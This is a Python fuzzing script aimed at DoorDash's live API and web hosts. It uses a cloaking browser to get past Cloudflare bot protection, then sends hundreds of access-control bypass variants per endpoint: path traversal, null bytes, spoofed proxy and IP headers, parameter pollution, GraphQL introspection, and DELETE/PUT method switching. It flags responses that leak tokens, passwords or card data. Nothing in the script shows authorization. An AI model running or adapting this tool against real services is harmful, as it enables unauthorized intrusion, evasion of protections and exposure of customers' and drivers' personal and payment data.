#!/usr/bin/env python3
"""
doorbash-idor-cloak.py — IDOR fuzzer applying bypass techniques to DoorDash endpoints.
Uses CloakBrowser to bypass Cloudflare on CF-protected targets.

Techniques:
1.  %20 space bypass    6.  Sub-path variants      11. Object param pollution
2.  Trailing slash       7.  HTTP Parameter Pollution
3.  Double slash         8.  JSON array injection
4.  Dot tricks           9.  Bracket notation
5.  API version downgrade 10. Leading zeros / wildcards
"""
import asyncio
import re
import json
import time
import random
from urllib.parse import urlencode

OUTPUT_DIR = "/tmp/doordash-cloak"
import os; os.makedirs(OUTPUT_DIR, exist_ok=True)

FINDINGS = []
ALL_RESULTS = []

# ---------------------------------------------------------------------------
# TARGET ENDPOINTS
# ---------------------------------------------------------------------------
TARGETS = [
    # === dasher-mobile-bff (public, no auth, no CF) ===
    {"name": "dasher-me", "host": "dasher-mobile-bff.doordash.com", "method": "GET", "path": "/v1/dashers/me", "query": {}, "body": None},
    {"name": "dasher-me-POST", "host": "dasher-mobile-bff.doordash.com", "method": "POST", "path": "/v1/dashers/me", "query": {}, "body": {}},
    {"name": "dasher-auth", "host": "dasher-mobile-bff.doordash.com", "method": "GET", "path": "/v1/auth", "query": {}, "body": None},
    {"name": "dasher-root-api", "host": "dasher-mobile-bff.doordash.com", "method": "GET", "path": "/v1/dashers", "query": {}, "body": None},

    # === api.doordash.com (API subdomain, 401 on /drive) ===
    {"name": "api-drive", "host": "api.doordash.com", "method": "GET", "path": "/drive", "query": {}, "body": None},
    {"name": "api-drive-v1", "host": "api.doordash.com", "method": "GET", "path": "/v1/drive", "query": {}, "body": None},
    {"name": "api-drive-v2", "host": "api.doordash.com", "method": "GET", "path": "/v2/drive", "query": {}, "body": None},

    # === risk-bff (GraphQL, no auth, no CF) ===
    {"name": "risk-bff-graphql", "host": "risk-bff.doordash.com", "method": "POST", "path": "/challenges", "query": {}, "body": {"query": "query { __typename }"}},

    # === www.doordash.com (CF protected — CloakBrowser) ===
    {"name": "www-orders-drive", "host": "www.doordash.com", "method": "GET", "path": "/orders/drive/", "query": {}, "body": None, "needs_cloak": True},
    {"name": "www-api-graphql", "host": "www.doordash.com", "method": "POST", "path": "/api/graphql", "query": {}, "body": {"query": "{ __typename }"}, "needs_cloak": True},
    {"name": "www-home", "host": "www.doordash.com", "method": "GET", "path": "/", "query": {}, "body": None, "needs_cloak": True},
    {"name": "www-api-v1", "host": "www.doordash.com", "method": "GET", "path": "/api/v1", "query": {}, "body": None, "needs_cloak": True},
    {"name": "www-api-v2", "host": "www.doordash.com", "method": "GET", "path": "/api/v2", "query": {}, "body": None, "needs_cloak": True},
    {"name": "www-consumer-graphql", "host": "www.doordash.com", "method": "POST", "path": "/api/consumer/graphql", "query": {}, "body": {"query": "{ __typename }"}, "needs_cloak": True},
    {"name": "www-merchant-graphql", "host": "www.doordash.com", "method": "POST", "path": "/api/merchant/graphql", "query": {}, "body": {"query": "{ __typename }"}, "needs_cloak": True},
]


# ---------------------------------------------------------------------------
# BYPASS TECHNIQUE GENERATOR
# ---------------------------------------------------------------------------
def generate_bypasses(target):
    """Generate all bypass variations for a target."""
    path = target["path"]
    query = target.get("query", {})
    body = target.get("body")
    bypasses = []

    # 1. Trailing symbols
    for sym in [",", ";", ":", "|", "..", "...", "%00", "\\", "../", "..;/", "%0a", "%0d%0a", "?", "!", "@", "#", "$", "%", "^", "*", "(", ")", "[", "]", "{", "}", "<", ">", "~", "+", "-", "_", " ", "%20", "%09", "//"]:
        bypasses.append(("trailing-" + sym.replace("%", "pct").replace("\\", "bslash").replace("/", "fslash").replace(" ", "space")[:20], path + sym, query, body, None, None))

    # 2. Trailing slash
    if not path.endswith("/"):
        bypasses.append(("trailing-slash", path + "/", query, body, None, None))

    # 3. Double slash in path
    parts = path.split("/")
    for i in range(1, len(parts)):
        modified = parts[:i] + [""] + parts[i:]
        bypasses.append((f"double-slash-{i}", "/".join(modified), query, body, None, None))

    # 4. Dot tricks
    for i in range(2, len(parts)):
        modified = parts[:i] + [".", ""] + parts[i:]
        bypasses.append((f"dot-path-{i}", "/".join(modified), query, body, None, None))
    # Path traversal
    if len(parts) >= 4:
        modified = parts[:1] + [".."] + parts[2:]
        bypasses.append(("path-traversal", "/".join(modified), query, body, None, None))

    # 5. API version downgrade/upgrade
    v_match = re.match(r"^(/v)(\d+)(/.*)", path)
    if v_match:
        for v in range(1, 6):
            downgraded = f"{v_match.group(1)}{v}{v_match.group(3)}"
            if downgraded != path:
                bypasses.append((f"version-v{v}", downgraded, query, body, None, None))
    else:
        for v in range(1, 4):
            if path.startswith("/api/"):
                bypasses.append((f"version-prefix-v{v}", f"/api/v{v}{path[4:]}", query, body, None, None))

    # 6. Sub-path variants
    for sub in ["/details", "/orders", "/profile", "/settings", "/data", "/info", "/status", "/summary", "/metadata", "/history", "/payments", "/earnings", "/statistics", "/activity", "/admin", "/internal", "/debug", "/test", "/config", "/graphql", "/rest", "/v1", "/v2", "/v3"]:
        bypasses.append((f"subpath-{sub.lstrip('/')}", path + sub, query, body, None, None))

    # 7. HTTP Parameter Pollution (query params)
    if query:
        for key in list(query.keys()):
            polluted = dict(query)
            polluted[key] = [query[key], "test"]
            bypasses.append((f"hpp-{key}-array", path, polluted, body, None, None))
            polluted2 = dict(query)
            polluted2[key.upper()] = "test"
            bypasses.append((f"hpp-{key}-case", path, polluted2, body, None, None))
    else:
        # For endpoints with no query params, add common ID params
        for param_name in ["id", "user_id", "order_id", "store_id", "driver_id", "dasher_id", "challengeId"]:
            bypasses.append((f"param-{param_name}", path, {param_name: "9"}, body, None, None))
            bypasses.append((f"hpp-{param_name}-dupe", path, {param_name: ["9", "test"]}, body, None, None))
            bypasses.append((f"bracket-{param_name}", path, {f"{param_name}[]": ["9", "test"]}, body, None, None))
            bypasses.append((f"object-{param_name}", path, {f"{param_name}[user]": "9", f"{param_name}[admin]": "true"}, body, None, None))

    # 8. JSON array injection (body)
    if body and isinstance(body, dict):
        for key in list(body.keys()):
            if isinstance(body[key], str):
                modified = dict(body)
                modified[key] = [body[key], "test"]
                bypasses.append((f"json-array-{key}", path, query, modified, None, None))
                modified2 = dict(body)
                modified2[key] = [body[key], None]
                bypasses.append((f"json-array-null-{key}", path, query, modified2, None, None))
            elif isinstance(body[key], (int, float)):
                modified = dict(body)
                modified[key] = [body[key], 9]
                bypasses.append((f"json-array-int-{key}", path, query, modified, None, None))

        # GraphQL-specific probes
        if "query" in body:
            schema_probes = [
                "query { __type(name: \"Dasher\") { name fields { name } } }",
                "query { __type(name: \"Drive\") { name fields { name } } }",
                "query { __type(name: \"Order\") { name fields { name } } }",
                "{__schema{types{name}}}",
                "query { _service { sdl } }",
                "{ __schema { queryType { name } mutationType { name } } }",
            ]
            for i, probe in enumerate(schema_probes):
                modified = dict(body)
                modified["query"] = probe
                bypasses.append((f"graphql-probe-{i}", path, query, modified, None, None))

    # 9. Leading zeros in query params
    if query:
        for key, val in query.items():
            if isinstance(val, str) and val.isdigit():
                bypasses.append((f"leading-zero-{key}", path, {key: f"00000{val}"}, body, None, None))

    # 10. Wildcards in query
    for key, val in query.items():
        if isinstance(val, str):
            bypasses.append((f"wildcard-{key}-pct", path, {**query, key: val + "%"}, body, None, None))
            bypasses.append((f"wildcard-{key}-star", path, {**query, key: val + "*"}, body, None, None))
            bypasses.append((f"wildcard-{key}-uscore", path, {**query, key: val + "_"}, body, None, None))

    # 11. Null byte injection
    for null_char in ["%00", "%2500"]:
        bypasses.append((f"null-byte-{null_char.replace('%','pct')}", path + null_char, query, body, None, None))

    # 12. Method switching
    if body is not None:
        for alt_method in ["PUT", "PATCH", "DELETE"]:
            bypasses.append((f"method-{alt_method}", path, query, body, alt_method, None))
    else:
        for alt_method in ["POST", "PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]:
            bypasses.append((f"method-{alt_method}", path, query, {}, alt_method, None))

    # 13. Proxy header injection
    proxy_headers = [
        {"X-Original-URL": path},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Rewrite-URL": path},
        {"X-HTTP-Method-Override": "GET"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
    ]
    for i, hdrs in enumerate(proxy_headers):
        bypasses.append((f"proxy-hdr-{i}", path, query, body, None, hdrs))

    # 14. Brackets notation on query keys
    for key in list(query.keys()):
        bypasses.append((f"bracket-{key}", path, {f"{key}[]": query[key]}, body, None, None))
        bypasses.append((f"object-{key}", path, {f"{key}[user]": "test", f"{key}[admin]": "true"}, body, None, None))

    return bypasses


# ---------------------------------------------------------------------------
# MAIN
# ---------------------------------------------------------------------------
async def main():
    from cloakbrowser import launch_async

    browser = await launch_async(headless=True)
    context = await browser.new_context()
    page = await context.new_page()

    # Warmup: load www.doordash.com for CF cookies
    print("🌐 Loading www.doordash.com for Cloudflare cookies...")
    try:
        await page.goto("https://www.doordash.com", wait_until="domcontentloaded", timeout=30000)
        await asyncio.sleep(3)
        print(f"   CF warmup done")
    except Exception as e:
        print(f"   CF warmup: {str(e)[:60]}")

    total_findings = 0
    total_tests = 0

    for target in TARGETS:
        name = target["name"]
        host = target["host"]
        method = target["method"]
        path = target["path"]
        needs_cloak = target.get("needs_cloak", False)

        print(f"\n{'='*60}")
        print(f"🎯 {name}: {method} {host}{path}")
        print(f"{'='*60}")

        # Generate bypasses
        bypasses = generate_bypasses(target)
        print(f"   Testing {len(bypasses)} bypass variations...")
        total_tests += len(bypasses)

        # Get baseline
        try:
            if target["body"]:
                baseline = await page.evaluate(f"""
                    async () => {{
                        try {{
                            const resp = await fetch('https://{host}{path}', {{
                                method: '{method}',
                                credentials: 'include',
                                headers: {{'Content-Type': 'application/json'}},
                                body: JSON.stringify({json.dumps(target["body"])})
                            }});
                            const text = await resp.text();
                            return {{status: resp.status, body: text.substring(0, 500)}};
                        }} catch(e) {{ return {{error: e.message}}; }}
                    }}
                """)
            else:
                baseline = await page.evaluate(f"""
                    async () => {{
                        try {{
                            const resp = await fetch('https://{host}{path}', {{
                                method: '{method}',
                                credentials: 'include'
                            }});
                            const text = await resp.text();
                            return {{status: resp.status, body: text.substring(0, 500)}};
                        }} catch(e) {{ return {{error: e.message}}; }}
                    }}
                """)
            print(f"   Baseline: {baseline.get('status', '?')} | {baseline.get('body', '')[:80]}")
        except:
            baseline = {"status": 0, "body": ""}

        # Test all bypasses
        for technique, bypass_path, bypass_query, bypass_body, bypass_method, bypass_headers in bypasses:
            method_to_use = bypass_method or method
            url = f"https://{host}{bypass_path}"
            if bypass_query:
                url += "?" + urlencode(bypass_query, doseq=True)

            try:
                body_json = json.dumps(bypass_body) if bypass_body else "null"
                has_body = bypass_body is not None

                header_js = ""
                if bypass_headers:
                    for hk, hv in bypass_headers.items():
                        header_js += f"'{hk}': '{hv}', "

                if has_body:
                    result = await page.evaluate(f"""
                        async () => {{
                            try {{
                                const resp = await fetch('{url}', {{
                                    method: '{method_to_use}',
                                    credentials: 'include',
                                    headers: {{'Content-Type': 'application/json', {header_js}}},
                                    body: JSON.stringify({body_json})
                                }});
                                const text = await resp.text();
                                return {{status: resp.status, body: text.substring(0, 500)}};
                            }} catch(e) {{ return {{error: e.message}}; }}
                        }}
                    """)
                else:
                    result = await page.evaluate(f"""
                        async () => {{
                            try {{
                                const resp = await fetch('{url}', {{
                                    method: '{method_to_use}',
                                    credentials: 'include',
                                    headers: {{{header_js}}}
                                }});
                                const text = await resp.text();
                                return {{status: resp.status, body: text.substring(0, 500)}};
                            }} catch(e) {{ return {{error: e.message}}; }}
                        }}
                    """)

                status = result.get("status", 0)
                body = result.get("body", "")

                # Detect anomalies vs baseline
                b_status = baseline.get("status", 0)
                anomalies = []
                if status and status != b_status:
                    if b_status >= 400 and status < 400:
                        anomalies.append(f"BYPASS {b_status}→{status}")
                    elif status == 500:
                        anomalies.append(f"CRASH→500")
                    elif status == 405:
                        anomalies.append(f"EXISTS→405")
                    else:
                        anomalies.append(f"CHANGE {b_status}→{status}")

                # Body size change (>20% different)
                b_len = len(baseline.get("body", ""))
                r_len = len(body)
                if b_len > 0 and r_len > 0:
                    ratio = r_len / b_len
                    if ratio > 1.3 or ratio < 0.7:
                        anomalies.append(f"SIZE_CHANGE {b_len}→{r_len} ({ratio:.1f}x)")

                # Data leak detection
                if body and len(body) > 50:
                    lower = body.lower()
                    for kw in ["token", "key", "secret", "password", "email", "user", "admin", "api_key", "session", "credential", "authorization", "bearer", "stripe", "payment", "dasher", "drive", "order", "address", "phone", "card"]:
                        if kw in lower and kw not in baseline.get("body", "").lower():
                            anomalies.append(f"DATA:{kw}")

                if anomalies:
                    icon = "🔥" if any("BYPASS" in a or "DATA" in a for a in anomalies) else "⚠️"
                    print(f"   {icon} {technique:35s} → {status} | {'; '.join(anomalies)}")
                    if body and len(body) > 10:
                        print(f"      Body: {body[:120]}")
                    FINDINGS.append({
                        "target": name, "technique": technique, "url": url,
                        "method": method_to_use, "status": status,
                        "body": body[:300], "anomalies": anomalies
                    })
                    total_findings += 1

                ALL_RESULTS.append({"target": name, "technique": technique, "url": url, "status": status, "body": body[:200]})

            except Exception as e:
                pass

            await asyncio.sleep(0.15)

        print(f"   Done: {len(bypasses)} tests")

    # Summary
    print(f"\n{'='*60}")
    print(f"📊 TOTAL: {total_findings} anomalies out of {total_tests} tests")
    print(f"{'='*60}")

    for f in FINDINGS:
        print(f"   🔥 [{f['target']}] {f['technique']:30s} → {f['status']} | {'; '.join(f['anomalies'][:2])}")

    with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
        json.dump(FINDINGS, fp, indent=2)
    with open(f"{OUTPUT_DIR}/all-results.json", "w") as fp:
        json.dump(ALL_RESULTS, fp, indent=2)

    print(f"\n💾 Saved to {OUTPUT_DIR}/")
    await browser.close()

if __name__ == "__main__":
    asyncio.run(main())
